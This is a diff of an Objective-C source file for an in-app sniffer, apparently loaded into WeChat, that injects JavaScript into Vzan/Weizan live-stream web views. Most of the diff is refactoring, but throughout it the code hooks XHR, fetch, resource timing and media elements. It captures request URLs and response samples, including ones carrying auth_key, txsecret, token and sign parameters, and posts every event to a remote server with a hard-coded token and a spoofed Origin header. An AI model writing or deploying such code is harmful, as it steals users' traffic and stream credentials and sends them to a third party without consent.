@@ -1,7 +1,5 @@
 // ALIWeChatWKSniffer_SafeGate.m
-// 目标：仅在进入 Vzan/微赞直播页后，且文档 ready，再注入JS（避免过早注入导致的闪退）
-// 机制：定时扫描现有 WKWebView -> 对其添加 KVO(URL/estimatedProgress) -> 命中目标域名且进度>=0.8 -> 再次确认 readyState -> 注入
-// 收集：抓啥都上报；命中流地址（m3u8/flv/auth_key…）本地弹窗+复制
+// 安全门控：仅在 Vzan/微赞直播页就绪后再注入；抓到的一切事件都上报，命中流地址本地弹窗+复制。
 
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
@@ -15,14 +13,20 @@ static NSString * const kPushToken = @"@Yy166431";
 static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }
 
 static const NSTimeInterval kScanInterval   = 1.2;   // 扫描现有 WKWebView 的间隔
-static const NSTimeInterval kDedupeWindow   = 60.0;  // URL 去重
-static const NSTimeInterval kInjectDelay    = 0.6;   // 达到条件后再延迟注入，进一步稳妥
-static const BOOL kShowPopupOnInject        = YES;   // 注入时提示
-static const BOOL kShowPopupOnHit           = YES;   // 命中流地址时弹窗+复制
+static const NSTimeInterval kDedupeWindow   = 60.0;  // URL 去重窗口
+static const NSTimeInterval kInjectDelay    = 0.6;   // 满足条件后再延迟注入
+static const BOOL kShowPopupOnInject        = YES;   // 注入成功弹窗
+static const BOOL kShowPopupOnHit           = YES;   // 命中流地址弹窗+复制
 
-// 目标域名（可增改）
+// 命中这些 host 才注入（可按需增减）
 static NSArray<NSString*> *TargetHosts(void) {
-    return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
+    return @[
+        @"ukmdg.cn",
+        @"vzuk.ukmdg.cn",
+        @"wehfws.vzuk.ukmdg.cn",
+        @"vzan.com",
+        @"weizan.com"
+    ];
 }
 
 #ifndef DEBUG_LOG
@@ -34,7 +38,7 @@ static NSArray<NSString*> *TargetHosts(void) {
 #define LOG(...)
 #endif
 
-#pragma mark - 工具/状态
+#pragma mark - 全局/工具
 
 static dispatch_queue_t gq;
 static NSMutableDictionary<NSString*, NSDate*> *g_seen;
@@ -100,24 +104,29 @@ static BOOL dedupe_skip(NSString *u){
     return skip;
 }
 
+#pragma mark - 上报（无自捕获链式重试）
+
+static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *body) {
+    if (idx >= paths.count) return;
+    NSString *url = [kPushHost stringByAppendingString:paths[idx]];
+    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
+    req.HTTPMethod = @"POST";
+    [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
+    [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
+    [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
+    req.HTTPBody = body;
+    [[[NSURLSession sharedSession] dataTaskWithRequest:req
+                                     completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e) {
+        NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
+        if (e || sc < 200 || sc >= 300) {
+            _ali_post_chain(paths, idx + 1, body);
+        }
+    }] resume];
+}
+
 static void postText(NSString *text){
     if (!text) return;
-    __block NSInteger idx = 0;
-    NSArray *paths = kPushPaths();
-    __block void (^tryNext)(void) = ^{
-        if (idx >= (NSInteger)paths.count) return;
-        NSString *url = [kPushHost stringByAppendingString:paths[idx++]];
-        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
-        req.HTTPMethod = @"POST";
-        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
-        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
-        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
-        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
-        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
-            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
-            if (e || sc<200 || sc>=300) tryNext();
-        }] resume];
-    }; tryNext();
+    _ali_post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
 }
 
 static NSString *jsonStringify(NSDictionary *obj){
@@ -129,6 +138,7 @@ static NSString *jsonStringify(NSDictionary *obj){
 static void handleRawEvent(NSDictionary *evt){
     NSString *js = jsonStringify(evt);
     if (js) postText(js);
+
     NSString *u = evt[@"url"];
     if (u && looksLikeStream(u) && !dedupe_skip(u)) {
         if (kShowPopupOnHit){
@@ -139,7 +149,7 @@ static void handleRawEvent(NSDictionary *evt){
     }
 }
 
-#pragma mark - JS（与上一版一致：抓啥都上报）
+#pragma mark - 注入的 JS（抓啥都上报）
 
 static NSString *inpageJS(void){
     return @
@@ -151,6 +161,7 @@ static NSString *inpageJS(void){
         "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1) return true;"
         "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('pull.')!=-1||u.indexOf('replay')!=-1||u.indexOf('live')!=-1) return true;return false;}"
       "send('INJECT_OK',{});"
+      // XHR
       "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
         "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
         "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
@@ -159,6 +170,7 @@ static NSString *inpageJS(void){
             "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample});if(looks(u))send('HIT',{from:'xhr',url:u});}catch(e){}};"
           "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
       "})();"
+      // fetch
       "(function(){if(!window.fetch||window.fetch.__ali_patched__)return;var F=window.fetch;window.fetch.__ali_patched__=true;"
         "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u){send('FETCH_REQ',{from:'fetch',url:u,method:m});}"
           "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();"
@@ -166,9 +178,11 @@ static NSString *inpageJS(void){
               "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
             "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}if(looks(u))send('HIT',{from:'fetch',url:u});}catch(e){}return r;});}"
         "catch(e){return F.apply(this,arguments)}})();"
+      // PerformanceObserver(resource)
       "(function(){if(!('PerformanceObserver'in window) || window.__ali_perf__)return;window.__ali_perf__=true;"
         "try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''});if(looks(u))send('HIT',{from:'perf',url:u});}}catch(e){}});"
         "ob.observe({type:'resource',buffered:true});}catch(e){}})();"
+      // <video>/<audio>
       "(function(){if(window.__ali_media__)return;window.__ali_media__=true;"
         "function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s});if(looks(s))send('HIT',{from:tag,url:s});}}catch(e){}}"
         "var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];"
@@ -182,7 +196,7 @@ static NSString *inpageJS(void){
     "}catch(e){console.log('[ALI_SNIF] inject error',e)}})();";
 }
 
-#pragma mark - Message handler
+#pragma mark - JS Bridge
 
 @interface ALIMessageHandler : NSObject <WKScriptMessageHandler>
 @end
@@ -196,7 +210,7 @@ static NSString *inpageJS(void){
 
 static ALIMessageHandler *g_handler;
 
-#pragma mark - 仅在命中目标域名 & ready 时注入
+#pragma mark - 仅命中目标域名 & ready 时注入
 
 static const void *kInjectedKey = &kInjectedKey;
 static const void *kKVOKey      = &kKVOKey;
@@ -212,7 +226,6 @@ static BOOL hostMatches(NSURL *url){
 
 static void try_inject_when_ready(WKWebView *wv){
     if (!wv) return;
-    // 二次确认：进度/readyState
     double prog = wv.estimatedProgress;
     if (prog < 0.8) return;
 
@@ -224,9 +237,7 @@ static void try_inject_when_ready(WKWebView *wv){
         NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
         if (flag.boolValue) return;
 
-        // 延迟一点再注入，进一步避免 race
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInjectDelay * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-            // 再次检查
             NSURL *u = wv.URL;
             if (!hostMatches(u)) return;
 
@@ -251,7 +262,7 @@ static void try_inject_when_ready(WKWebView *wv){
     }];
 }
 
-#pragma mark - KVO 监听 URL/进度
+#pragma mark - KVO(URL/estimatedProgress)
 
 @interface _ALIKVOBox : NSObject
 @property (nonatomic, weak) WKWebView *wv;
@@ -308,7 +319,7 @@ static void scan_loop(void){
             for (UIWindow *w in UIApplication.sharedApplication.windows) walk_view(w);
         }@catch(__unused NSException *e){}
     });
-    dispatch_after(dispatch_time(DIS_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval * NSEC_PER_SEC)), gq, ^{ scan_loop(); });
 }
 
 #pragma mark - 入口
@@ -317,6 +328,5 @@ __attribute__((constructor))
 static void ALIWeChatWKSnifferSafeGateInit(void){
     if (!gq)    gq    = dispatch_queue_create("com.aliwechat.wksniffer.safe", DISPATCH_QUEUE_SERIAL);
     if (!g_seen)g_seen= [NSMutableDictionary dictionary];
-    // 首次不做任何注入，只启动扫描与KVO，等进入目标域名且ready再注入
-    scan_loop();
+    scan_loop(); // 仅启动扫描+KVO；真正注入在命中域名且页面就绪时
 }
